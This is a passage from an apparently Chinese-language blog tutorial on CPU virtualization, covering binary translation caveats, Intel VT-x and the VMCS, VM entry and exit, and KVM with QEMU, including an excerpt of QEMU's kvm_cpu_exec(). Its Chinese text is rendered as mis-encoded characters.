æŒ‡ä»¤å¯ä»¥ç›´æ¥ç¿»è¯‘ä¸ºç½® vcpu çš„ flags å¯„å­˜å™¨çš„ IF ä½ä¸º0ï¼‰ï¼Œä½†å¯¹äºç¨å¾®å¤æ‚ä¸€ç‚¹çš„æŒ‡ä»¤ï¼Œåˆ™éœ€è¦è¿›è¡Œæ·±åº¦æ¨¡æ‹Ÿï¼Œåˆ©ç”¨è·³è½¬æŒ‡ä»¤é™·å…¥ VMM ä¸­ï¼Œè¿™é€šå¸¸ä¼šé€ æˆä¸€å®šçš„æ€§èƒ½å¼€é”€</li></ul><blockquote><p>ä¾‹å¦‚è¿™æ˜¯ Qemu ä¸­çš„ä¸€ä¸ªåŸºæœ¬å—ä»£ç ç¿»è¯‘çš„ä¾‹å­ï¼š</p><p><img src="https://s2.loli.net/2022/08/14/ZSNn8iyCG9Tove6.png" alt="image.png"></p></blockquote><p>ç”±äºäºŒè¿›åˆ¶ä»£ç ç¿»è¯‘æŠ€æœ¯ä½¿ç”¨äº†æ›´ä¸ºå¤æ‚çš„è¿‡ç¨‹ï¼Œç”±æ­¤ä¹Ÿä¼šå¼•å…¥æ›´å¤šçš„é—®é¢˜ï¼Œå¯¹äºä»¥ä¸‹æƒ…å½¢åˆ™éœ€è¦é¢å¤–çš„å¤„ç†ï¼š</p><ul><li>è‡ªä¿®æ”¹ä»£ç ï¼ˆSelf Modifying Codeï¼‰ã€‚è¿™ç±»ç¨‹åºä¼šåœ¨è¿è¡Œæ—¶ä¿®æ”¹è‡ªèº«æ‰€æ‰§è¡Œçš„ä»£ç ï¼Œè¿™éœ€è¦æˆ‘ä»¬çš„ Emulator å¯¹æ–°ç”Ÿæˆçš„ä»£ç è¿›è¡Œé‡ç¿»è¯‘</li><li>è‡ªå‚è€ƒä»£ç ï¼ˆSelf Referential Codeï¼‰ã€‚è¿™ç±»ç¨‹åºä¼šåœ¨è¿è¡Œä¸­è¯»å–è‡ªå·±çš„ä»£ç æ®µä¸­å†…å®¹ï¼Œè¿™éœ€è¦æˆ‘ä»¬é¢å¤–è¿›è¡Œå¤„ç†ï¼Œä½¿å…¶è¯»å–åŸä»£ç æ®µä¸­å†…å®¹è€Œéç¿»è¯‘åçš„ä»£ç </li><li>ç²¾ç¡®å¼‚å¸¸ï¼ˆPrecise Exceptionsï¼‰ã€‚å³åœ¨ç¿»è¯‘ä»£ç æ‰§è¡Œçš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†ä¸­æ–­æˆ–å¼‚å¸¸ï¼Œè¿™éœ€è¦å°†è¿è¡ŒçŠ¶æ€æ¢å¤åˆ°åŸä»£ç æ‰§è¡Œåˆ°å¼‚å¸¸ç‚¹æ—¶çš„çŠ¶æ€ï¼Œä¹‹åå†äº¤ç»™ Guest OS å¤„ç†ã€‚BT æŠ€æœ¯æš‚å¾ˆéš¾å¾ˆå¥½åœ°å¤„ç†è¿™ç§æƒ…å†µï¼Œå› ä¸ºç¿»è¯‘åçš„ä»£ç ä¸åŸä»£ç å·²ç»å¤±å»äº†é€æ¡å¯¹åº”çš„å…³ç³»ã€‚ä¸€ä¸ªå¯è¡Œçš„è§£å†³æ–¹æ¡ˆå°±æ˜¯åœ¨å‘ç”Ÿå¼‚å¸¸æ—¶è¿›è¡Œå›æ»šï¼Œä¹‹åé‡æ–°ä½¿ç”¨è§£é‡Šæ‰§è¡Œçš„æ–¹å¼</li><li>å®æ—¶ä»£ç ã€‚è¿™ç±»ä»£ç å¯¹äºå®æ—¶æ€§è¦æ±‚è¾ƒé«˜ï¼Œåœ¨æ¨¡æ‹Ÿç¯å¢ƒä¸‹è¿è¡Œä¼šæŸå¤±æ—¶é—´ç²¾ç¡®æ€§ï¼Œç›®å‰æš‚æ—¶æ— æ³•è§£å†³</li></ul><h2 id="äºŒã€ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–-Intel-VT-x">äºŒã€ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ– - Intel VT-x</h2><blockquote><p><s>å¬è¯´ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–ä¸€å‡ºæ¥ Xen å°±æ²¡äººç”¨äº†</s></p></blockquote><h3 id="I-æ¦‚è¿°">I. æ¦‚è¿°</h3><p>Intel VT æŠ€æœ¯æ˜¯ Intel ä¸º x86 è™šæ‹ŸåŒ–æ‰€æä¾›çš„ç¡¬ä»¶æ”¯æŒï¼Œå…¶ä¸­ç”¨äºè¾…åŠ© CPU è™šæ‹ŸåŒ–çš„æ˜¯ <code>Intel VT-x</code> æŠ€æœ¯ï¼Œå…¶æ‰©å±•äº†ä¼ ç»Ÿçš„ IA32 å¤„ç†å™¨æ¶æ„ï¼Œä¸º IA32 æ¶æ„çš„ CPU è™šæ‹ŸåŒ–æä¾›äº†ç¡¬ä»¶æ”¯æŒ</p><p>VT-x æŠ€æœ¯ä¸º Intel CPU é¢å¤–å¼•å…¥äº†ä¸¤ç§è¿è¡Œæ¨¡å¼ï¼Œç»Ÿç§°ä¸º**ã€ŒVMX æ“ä½œæ¨¡å¼ã€<strong>ï¼ˆVirtual Machine eXtensionsï¼‰ï¼Œé€šè¿‡ <code>vmxon</code> æŒ‡ä»¤å¼€å¯ï¼Œè¿™ä¸¤ç§è¿è¡Œæ¨¡å¼</strong>éƒ½ç‹¬ç«‹æœ‰ç€è‡ªå·±çš„åˆ†çº§ä¿æŠ¤ç¯**ï¼š</p><ul><li><code>VMX Root Operation</code>ï¼šHypervisor æ‰€å·¥ä½œçš„æ¨¡å¼ï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹å¯ä»¥è®¿é—®è®¡ç®—æœºçš„æ‰€æœ‰èµ„æºï¼Œå¹¶å¯¹ VM è¿›è¡Œè°ƒåº¦</li><li><code>VMX Non-Root Operation</code>ï¼šVM æ‰€å·¥ä½œçš„æ¨¡å¼ï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ä»…èƒ½è®¿é—®éæ•æ„Ÿèµ„æºï¼Œå¯¹äºæ•æ„Ÿèµ„æºçš„è®¿é—®ï¼ˆä¾‹å¦‚ I/O æ“ä½œï¼‰ä¼šä½¿å¾— CPU é€€å‡º Non-Root æ¨¡å¼å¹¶é™·å…¥ Hypervisor ä¸­ï¼Œç”± Hypervisor å¤„ç†åå†é‡æ–°è¿›å…¥ Non-Root æ¨¡å¼æ¢å¤ VM çš„è¿è¡Œ</li></ul><p>ç”±æ­¤ï¼Œæˆ‘ä»¬å¯¹ Root æ¨¡å¼ä¸ Non-Root æ¨¡å¼é—´çš„åˆ‡æ¢è¡Œä¸ºè¿›è¡Œå®šä¹‰ï¼š</p><ul><li><code>VM-Entry</code>ï¼šHypervisor ä¿å­˜è‡ªèº«çŠ¶æ€ä¿¡æ¯ï¼Œåˆ‡æ¢åˆ° VMX Non-Root æ¨¡å¼ï¼Œè½½å…¥ VM çŠ¶æ€ä¿¡æ¯ï¼Œæ¢å¤ VM æ‰§è¡Œæµ</li><li><code>VM-Exit</code>ï¼šVM è¿è¡Œæš‚åœå¹¶ä¿å­˜è‡ªèº«çŠ¶æ€ä¿¡æ¯ï¼Œåˆ‡æ¢åˆ° VMX Root æ¨¡å¼ï¼Œè½½å…¥ Hypervisor çŠ¶æ€ä¿¡æ¯ï¼Œæ‰§è¡Œç›¸åº”çš„å¤„ç†å‡½æ•°</li></ul><p><img src="https://s2.loli.net/2022/08/11/uzmNXaOP6HSVqFL.png" alt="image.png"></p><p>ç”±äº Non-Root æ¨¡å¼ä¸ Root æ¨¡å¼éƒ½å„è‡ªæœ‰ç€è‡ªå·±çš„åˆ†çº§ä¿æŠ¤ç¯ï¼Œå› æ­¤ Host OS ä¸ Guest OS éƒ½å¯ä»¥<strong>ä¸åŠ ä¿®æ”¹åœ°åœ¨è‡ªå·±å¯¹åº”çš„æ¨¡å¼ä¸‹ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šè¿è¡Œ</strong>ï¼Œä»…æœ‰å½“ Guest OS æ¶‰åŠåˆ°æ•æ„Ÿèµ„æºçš„è®¿é—®åŠ Host OS å¯¹ VM çš„è°ƒåº¦æ—¶æ‰ä¼šå‘ç”Ÿåˆ‡æ¢ï¼Œè¿™åœ¨ç¡®ä¿äº† VM é«˜æ€§èƒ½çš„åŒæ—¶æ»¡è¶³äº†ã€ŒTrap &amp; Emulateã€æ¨¡å‹å®ç°ï¼Œä¹Ÿè§£å†³äº† x86 æ¶æ„çš„è™šæ‹ŸåŒ–æ¼æ´</p><h3 id="II-VMCS">II. VMCS</h3><p>åœ¨ Intel VT-x æŠ€æœ¯å¼•å…¥äº†<code>VMCS</code>ï¼ˆ<strong>Virtual-Machine Control Structure</strong>ï¼‰ï¼Œç”¨ä»¥ä¿å­˜ CPU è™šæ‹ŸåŒ–æ‰€éœ€è¦çš„ç›¸å…³çŠ¶æ€ï¼Œ<strong>æ¯ä¸ª virtual CPU å¯¹åº”æœ‰ä¸€ä¸ª VMCS</strong></p><p>VMCS ä¸ç‰©ç† CPU æ˜¯<strong>ä¸€ä¸€å¯¹åº”çš„ç»‘å®šå…³ç³»</strong>ï¼Œå³åœ¨åŒä¸€æ—¶åˆ»ä¸€ä¸ªç‰©ç† CPU åªèƒ½ä¸ä¸€ä¸ª VMCS ç»‘å®šï¼Œåä¹‹äº¦ç„¶ï¼Œä½†åœ¨ä¸åŒçš„æ—¶åˆ»æˆ‘ä»¬å¯ä»¥å°† VMCS ç»‘å®šåˆ°ä¸åŒçš„ç‰©ç† CPU ä¸Šï¼Œç§°ä¹‹ä¸º VMCS çš„<strong>è¿ç§»</strong>ï¼ˆMigrationï¼‰</p><p>ä¸ VMCS çš„ç»‘å®šä¸è§£ç»‘ç›¸å…³çš„æ˜¯ä»¥ä¸‹ä¸¤æ¡æŒ‡ä»¤ï¼š</p><table><thead><tr><th style="text-align:center">Instruction</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">VMPTRLD &lt;VMCS åœ°å€&gt;</td><td style="text-align:center">å°†æŒ‡å®šçš„ VMCS ä¸æ‰§è¡Œè¯¥æŒ‡ä»¤çš„ CPU è¿›è¡Œç»‘å®š</td></tr><tr><td style="text-align:center">VMCLEAR</td><td style="text-align:center">å°†æ‰§è¡Œè¯¥æŒ‡ä»¤çš„ CPU ä¸å…¶ VMCS è¿›è¡Œè§£ç»‘</td></tr></tbody></table><p>VT-x ä¸­å°† VMCS å®šä¹‰ä¸ºä¸€ä¸ª<strong>æœ€å¤§ä¸è¶…è¿‡ 4KB çš„å†…å­˜å—ï¼Œä¸”åº”ä¸ 4KB å¯¹é½</strong>ï¼Œå…¶å†…å®¹æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VMCS</span> &#123;</span><br>    <span class="hljs-comment">/* ç‰ˆæœ¬å·ï¼Œ4å­—èŠ‚ */</span><br><span class="hljs-type">uint32_t</span> vmcs_revision_identifier:<span class="hljs-number">31</span>, shadow_vmcs_indicator:<span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-comment">/* ä¸­æ­¢æ ‡è¯†ï¼Œ4å­—èŠ‚</span><br><span class="hljs-comment">     * å½“ VM-Exit å¤±è´¥æ—¶ä¾¿ä¼šäº§ç”Ÿ VMX ä¸­æ­¢ï¼Œå¹¶åœ¨æ­¤å¤„å­˜æ”¾åŸå› </span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">uint32_t</span> vmx_abort_indicator;<br>    <br>    <span class="hljs-comment">/* æ•°æ®åŸŸ */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VMCSData</span> <span class="hljs-title">vmcs_data</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>VMCS æ•°æ®åŸŸ å­˜æ”¾ç€ VMCS ä¸»è¦çš„ä¿¡æ¯ï¼Œåˆ†ä¸ºä»¥ä¸‹å…­ä¸ªå­åŸŸï¼š</p><ul><li><p><strong>Guest-state area</strong>ï¼šä¿å­˜ VM å¯„å­˜å™¨çŠ¶æ€ï¼Œåœ¨ VM-entry æ—¶åŠ è½½ï¼Œåœ¨ VM-exit æ—¶ä¿å­˜</p></li><li><p><strong>Host-state area</strong>ï¼šä¿å­˜ Hypervisor å¯„å­˜å™¨çŠ¶æ€ï¼Œåœ¨ VM-exit æ—¶åŠ è½½</p><p><img src="https://s2.loli.net/2022/08/15/C8wMpWE5X7S1KYP.png" alt="image.png"></p></li><li><p><strong>VM-execution control fileds</strong>ï¼šæ§åˆ¶ <code>Non-Root</code> æ¨¡å¼ä¸‹çš„å¤„ç†å™¨è¡Œä¸º</p></li><li><p><strong>VM-entry  control fileds</strong>ï¼šæ§åˆ¶ <code>VM-Entry</code> è¿‡ç¨‹ä¸­çš„æŸäº›è¡Œä¸º</p></li><li><p><strong>VM-exit  control fileds</strong>ï¼šæ§åˆ¶ <code>VM-Exit</code> è¿‡ç¨‹ä¸­çš„æŸäº›è¡Œä¸º</p></li><li><p><strong>VM-exit information fields</strong>ï¼šä¿å­˜ <code>VM-Exit</code> çš„åŸºæœ¬åŸå› åŠå…¶ä»–è¯¦ç»†ä¿¡æ¯ï¼Œåœ¨ä¸€äº›å¤„ç†å™¨ä¸Šè¯¥åŸŸä¸ºåªè¯»åŸŸ</p><p><img src="https://s2.loli.net/2022/08/15/jqQDsA6UHZ7wy8z.png" alt="image.png"></p></li></ul><p>æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹ä¸¤æ¡æŒ‡ä»¤è¯»å†™ VMCSï¼š</p><table><thead><tr><th style="text-align:center">Instruction</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">VMREAD &lt;ç´¢å¼•&gt;</td><td style="text-align:center">è¯» VMCS ä¸­â€œç´¢å¼•â€æŒ‡å®šçš„åŸŸ</td></tr><tr><td style="text-align:center">VMWRITE &lt;ç´¢å¼•&gt; &lt;æ•°æ®&gt;</td><td style="text-align:center">å‘ VMCS ä¸­â€œç´¢å¼•â€æŒ‡å®šçš„åŸŸå†™å…¥æ•°æ®</td></tr></tbody></table><blockquote><p>è¿™é‡Œçš„ç´¢å¼•å¹¶éåç§»å€¼ï¼Œè€Œæ˜¯ Intel ä¸ºæ•°æ®åŸŸä¸­æ¯ä¸ªå­—æ®µéƒ½å®šä¹‰äº†ä¸€ä¸ªç‹¬ç‰¹çš„ç´¢å¼•å€¼ï¼Œä¾‹å¦‚ Guest State Area ä¸­ ES æ®µé€‰æ‹©å­çš„ç´¢å¼•å€¼ä¾¿æ˜¯ <code>0x00000800</code></p><p>å½“ç„¶ï¼Œè¦æŠŠæ‰€æœ‰åŸŸçš„ç´¢å¼•éƒ½èƒŒä¸‹æ¥å¹¶ä¸ç°å®ï¼Œæœ€å¥½çš„åŠæ³•è¿˜æ˜¯å¤šå¤šæŸ¥è¡¨ï¼šï¼‰æ¨èé˜…è¯»ï¼š<a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel SDM</a> çš„ <a href="https://cdrdv2.intel.com/v1/dl/getContent/671506">IntelÂ® 64 and IA-32 Architectures Software Developerâ€™s Manual Volume 3C: System Programming Guide, Part 3</a></p></blockquote><h3 id="III-VMX-æ“ä½œæ¨¡å¼">III. VMX æ“ä½œæ¨¡å¼</h3><p>ä½œä¸ºä¼ ç»Ÿçš„ IA32 æ¶æ„çš„æ‰©å±•ï¼ŒVMX æ“ä½œæ¨¡å¼åœ¨é»˜è®¤ä¸‹æ˜¯å…³é—­çš„ï¼Œåªæœ‰å½“ VMM éœ€è¦ä½¿ç”¨ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–åŠŸèƒ½æ—¶æ‰ä¼šä½¿ç”¨ Intel æä¾›çš„ä¸¤æ¡æ–°æŒ‡ä»¤æ¥å¼€å…³ VMX æ“ä½œæ¨¡å¼ï¼š</p><ul><li><code>VMXON</code>ï¼šå¼€å¯ VMX æ“ä½œæ¨¡å¼</li><li><code>VMXOFF</code>ï¼šå…³é—­ VMX æ“ä½œæ¨¡å¼</li></ul><p>åœ¨ Intel SDM ä¸­æè¿°çš„ VMX ç”Ÿå‘½å‘¨æœŸå¦‚ä¸‹ï¼š</p><ul><li>è½¯ä»¶é€šè¿‡ <code>VMXON</code> æŒ‡ä»¤è¿›å…¥ VMX æ“ä½œæ¨¡å¼</li><li>VMM å¯ä»¥é€šè¿‡ <code>VM entries</code> è¿›å…¥ Guest VMï¼ˆå•æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ª VMï¼‰ï¼ŒVMM é€šè¿‡ <code>VMLAUNCH</code> ï¼ˆç¬¬ä¸€æ¬¡è¿›å…¥ VMï¼‰ä¸ <code>VMRESUME</code> ï¼ˆä» VMM ä¸­æ¢å¤åˆ° VMï¼‰æŒ‡ä»¤æ¥ä½¿èƒ½ <code>VM entry</code>ï¼Œé€šè¿‡ <code>VM exits</code> é‡è·æ§åˆ¶æƒ</li><li><code>VM exits</code> é€šè¿‡ VMM æŒ‡å®šçš„å…¥å£ç‚¹ç§»äº¤æ§åˆ¶æƒï¼ŒVMM å¯¹ VM çš„é€€å‡ºåŸå› è¿›è¡Œå“åº”åé€šè¿‡ <code>VM entry</code> è¿”å›åˆ° VM ä¸­</li><li>å½“ VMM æƒ³è¦åœæ­¢è‡ªèº«è¿è¡Œå¹¶é€€å‡º VMX æ“ä½œæ¨¡å¼æ—¶ï¼Œå…¶é€šè¿‡ <code>VMXOFF</code> æŒ‡ä»¤æ¥å®Œæˆ</li></ul><p><img src="https://s2.loli.net/2022/09/05/FXCzMI3N4JafQRe.png" alt="image.png"></p><p>ç°åœ¨æˆ‘ä»¬æ¥æ·±å…¥ <code>VM entry</code> ä¸ <code>VM exit</code> è¿™ä¸¤ä¸ªè¡Œä¸ºçš„å®ç°ç»†èŠ‚ä¸­ï¼Œåœ¨å…¶æµç¨‹ä¸­ä»–ä»¬åˆ†åˆ«è¿›è¡Œäº†å¦‚ä¸‹åŠ¨ä½œï¼š</p><ul><li><strong>VM entry</strong>ï¼šä» Hypervisor åˆ‡æ¢åˆ° VM<ul><li>æ£€æŸ¥ VMCS åˆæ³•æ€§ï¼ˆå„å­—æ®µå€¼æ˜¯å¦åˆæ³•ï¼‰</li><li>åŠ è½½ VMCS çš„ <code>Guest-state area</code> ä¸­çš„å„å­—æ®µåˆ°å¯¹åº”çš„å¯„å­˜å™¨</li><li>åŠ è½½æŒ‡å®šçš„ MSR</li><li>è®¾ç½® VMCS çš„çŠ¶æ€ä¸º <code>launched</code></li><li>æ ¹æ®éœ€è¦é€šè¿‡å†™ VMCS çš„ <code>VM-entry Interrucption-Information</code> å‘ VM è¿›è¡Œ<strong>äº‹ä»¶æ³¨å…¥</strong>ï¼ˆå¦‚å¼‚å¸¸ã€å¼‚æ­¥ä¸­æ–­ç­‰ï¼‰</li></ul></li><li><strong>VM exit</strong>ï¼šä» VM åˆ‡æ¢åˆ° Hypervisor<ul><li>å°† VM é€€å‡ºçš„åŸå› ä¸è¯¦ç»†ä¿¡æ¯å†™å…¥ VMCS çš„  <code>VM-exit information fields</code></li><li>å°† VM çš„å¯„å­˜å™¨ä¿å­˜è‡³ VMCS çš„ <code>Guest-state area</code></li><li>ä» VMCS çš„ <code>Host-state area</code> ä¸­æ¢å¤ Host å¯„å­˜å™¨</li><li>åŠ è½½æŒ‡å®š MSR</li></ul></li></ul><p><img src="https://s2.loli.net/2022/08/11/vzj8dDtgLk2JI6Q.png" alt="image.png"></p><blockquote><p>è¿™é‡Œç¬”è€…ä¸ºå¤§å®¶è¡¥å……ä¸€ä¸ªæ¦‚å¿µï¼š<strong>Model Specific Register</strong>ï¼Œç®€ç§° MSRï¼Œæ˜¯ x86 ä¸‹çš„ä¸€ç»„ç”¨æ¥<strong>æ§åˆ¶CPUè¿è¡Œã€åŠŸèƒ½å¼€å…³ã€è°ƒè¯•ã€è·Ÿè¸ªç¨‹åºæ‰§è¡Œã€ç›‘æµ‹CPUæ€§èƒ½</strong>ç­‰æ–¹é¢çš„å¯„å­˜å™¨</p><blockquote><p>ä¾‹å¦‚ <code>syscall</code> æŒ‡ä»¤ä¾¿æ˜¯é€šè¿‡ MSR å¯„å­˜å™¨æ¥è·å–åˆ°å†…æ ¸ç³»ç»Ÿè°ƒç”¨çš„å…¥å£ç‚¹</p></blockquote><p>æ¯ä¸ª MSR å¯„å­˜å™¨éƒ½ä¼šæœ‰ä¸€ä¸ª idï¼Œç§°ä¹‹ä¸º <code>MSR Index</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ª id æ¥åˆ©ç”¨ <code>RDMSR</code> ä¸ <code>WRMSR</code> æŒ‡ä»¤è¯»å†™æŒ‡å®šçš„ MSR å¯„å­˜å™¨</p><p>æˆ‘ä»¬å¯ä»¥åœ¨ Intel SDM çš„ Volume 4 ä¸­è·å–åˆ°åˆ° MSR å¯„å­˜å™¨çš„è¯¦ç»†ä¿¡æ¯</p></blockquote><h2 id="ä¸‰ã€KVM-QEMU-KVM">ä¸‰ã€KVM &amp; QEMU-KVM</h2><p>ä¸‹é¢æˆ‘ä»¬æ¥ä»‹ç» KVMâ€”â€”<strong>Kernel-based Virtual Machine</strong>ï¼Œæ˜¯ä¸€ä¸ªè‡ª Linux 2.6.20 åé›†æˆåœ¨ kernel ä¸­çš„ä¸€ä¸ª<strong>å¼€æºç³»ç»Ÿè™šæ‹ŸåŒ–å†…æ ¸æ¨¡å—</strong>ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªä¾èµ–äºç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–çš„ä½äº kernel ä¸­çš„ Hypervisorï¼Œæˆ–è€…è¯´<strong>KVM å°† Linux kernel å˜æˆäº† Hypervisor</strong>ï¼Œå¹¶æä¾›äº†ç›¸åº”çš„ç”¨æˆ·æ€æ“ä½œ VM çš„æ¥å£ï¼š <code>/dev/kvm</code> ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ ioctl æŒ‡ä»¤æ¥æ“ä½œ KVM</p><p>ä½† KVM æœ¬èº«ä»…æä¾›äº† CPU ä¸å†…å­˜çš„è™šæ‹ŸåŒ–ï¼Œä¸èƒ½æ„æˆä¸€ä¸ªå®Œæ•´çš„è™šæ‹ŸåŒ–ç¯å¢ƒï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥å¤ç”¨ç°æœ‰çš„å…¨è™šæ‹ŸåŒ–æ–¹æ¡ˆï¼Œ<strong>å°†æ¨¡æ‹Ÿ CPU ä¸å†…å­˜çš„å·¥ä½œäº¤ç”± KVM å®Œæˆ</strong>ï¼Œè¿™æ ·ä¾¿èƒ½ç›´æ¥é€šè¿‡ KVM æ¥å€ŸåŠ©ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–ä»¥æé«˜è™šæ‹Ÿæœºæ€§èƒ½</p><p>é‚£ä¹ˆæˆ‘ä»¬æœ‰è¿™æ ·çš„ä¸€ä¸ªç°æˆçš„å®Œå¤‡çš„å…¨è™šæ‹ŸåŒ–å®ç°æ–¹æ¡ˆå—ï¼Ÿç­”æ¡ˆæ˜¯æœ‰çš„â€”â€”<strong>QEMU</strong> æœ¬èº«ä¾¿<strong>å®Œæ•´æ¨¡æ‹Ÿäº†ä¸€æ•´å¥—è™šæ‹Ÿæœºç¯å¢ƒ</strong>ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ QEMU çš„ä»£ç ï¼Œä½¿å…¶é€šè¿‡ KVM æ¥åˆ›å»ºä¸è¿è¡Œè™šæ‹Ÿæœºï¼Œè€Œè®¾å¤‡æ¨¡æ‹Ÿç­‰ä¾æ—§å¤ç”¨åŸæœ‰çš„æ¡†æ¶ï¼Œ<strong>è¿™æ ·æˆ‘ä»¬å°±å®ç°äº†ä¸€ä¸ªé«˜æ€§èƒ½çš„å…¨è™šæ‹ŸåŒ–å¹³å°ï¼šKVM + QEMU</strong></p><p><img src="https://s2.loli.net/2022/08/29/7WByzSrM9QYPsKH.png" alt="image.png"></p><p>åˆ©ç”¨QEMU + KVM è¿›è¡Œè™šæ‹ŸåŒ–çš„æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p><ul><li>QEMU é€šè¿‡ ioctl è¿›å…¥å†…æ ¸æ€å°†æ§åˆ¶æƒç§»äº¤ KVMï¼ŒKVM è¿›è¡Œ VM çš„è¿è¡Œ</li><li>äº§ç”Ÿ VM-Exitï¼ŒKVM æ¥ç®¡ï¼Œåˆ¤æ–­åŸå› å¹¶å†³å®šç»§ç»­è¿è¡Œè¿˜æ˜¯äº¤ç”± QEMU å¤„ç†</li><li>è‹¥æ˜¯åè€…ï¼Œæ¢å¤åˆ°ç”¨æˆ·æ€ QEMU ä¸­çš„å¤„ç†ä»£ç è¿›è¡Œç›¸åº”çš„å¤„ç†ï¼Œä¹‹åé€€å‡ºæˆ–å›åˆ°ç¬¬ä¸€æ­¥</li></ul><p><img src="https://s2.loli.net/2022/08/05/GUxVBYWnbdzA6KD.png" alt="image.png"></p><p>è¿™ä¸ªåŸºæœ¬æ‰§è¡Œæ¡†æ¶å®é™…ä¸Šä¸º QEMU æºç  <code>accel/kvm/kvm-all.c</code> ä¸­çš„ <code>kvm_cpu_exec()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">kvm_cpu_exec</span><span class="hljs-params">(CPUState *cpu)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    cpu_exec_start(cpu);<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * å¼€å§‹è¿è¡Œ VMï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ ioctl(kvm_fd, KVM_RUN)</span><br><span class="hljs-comment">         * å½“äº§ç”Ÿ VM-Exit æ—¶ï¼Œé¦–å…ˆåœ¨ KVM ä¸­å®Œæˆå¤„ç†ï¼Œ</span><br><span class="hljs-comment">         * è‹¥äº§ç”Ÿ IOï¼Œåˆ™é€€å‡ºå†…æ ¸æ€ï¼Œå³æ¢å¤åˆ°è¿™é‡Œï¼Œæ¥ä¸‹æ¥è¿›å…¥åˆ°ç”¨æˆ·æ€çš„å¤„ç†</span><br><span class="hljs-comment">         */</span><br>        run_ret = kvm_vcpu_ioctl(cpu, KVM_RUN, <span class="hljs-number">0</span>);<br>        <br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">if</span> (run_ret &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * è¿”å›å€¼å°äº 0 è¯´æ˜ VM è¿è¡Œå‡ºäº†äº›é—®é¢˜ï¼Œ</span><br><span class="hljs-comment">             * è¿™é‡Œä¼šç®€å•å¤„ç†å break æ‰“ç ´å¤§å¾ªç¯ </span><br><span class="hljs-comment">             */</span><br>        <span class="hljs-comment">//...</span><br>        &#125;<br>        <br>        trace_kvm_run_exit(cpu-&gt;cpu_index, run-&gt;exit_reason);<br>        <span class="hljs-comment">/* è¿™é‡Œå°±æ˜¯ä¸€ä¸ªå¤§çš„ switchï¼Œæ ¹æ®é€€å‡ºçš„åŸå› è¿›è¡Œä¸åŒçš„å¤„ç†ï¼Œå°±ä¸æ”¾å®Œæ•´ä»£ç äº† */</span><br>        <span class="hljs-keyword">switch</span> (run-&gt;exit_reason) &#123;<br>        <span class="hljs-keyword">case</span> KVM_EXIT_IO:<br>            DPRINTF(<span class="hljs-string">&quot;handle_io\n&quot;</span>);<br>            <span class="hljs-comment">/* Called outside BQL */</span><br>            kvm_handle_io(run-&gt;io.port, attrs,<br>                          (<span class="hljs-type">uint8_t</span> *)run + run-&gt;io.data_offset,<br>                          run-&gt;io.direction,<br>                          run-&gt;io.size,<br>                          run-&gt;io.count);<br>            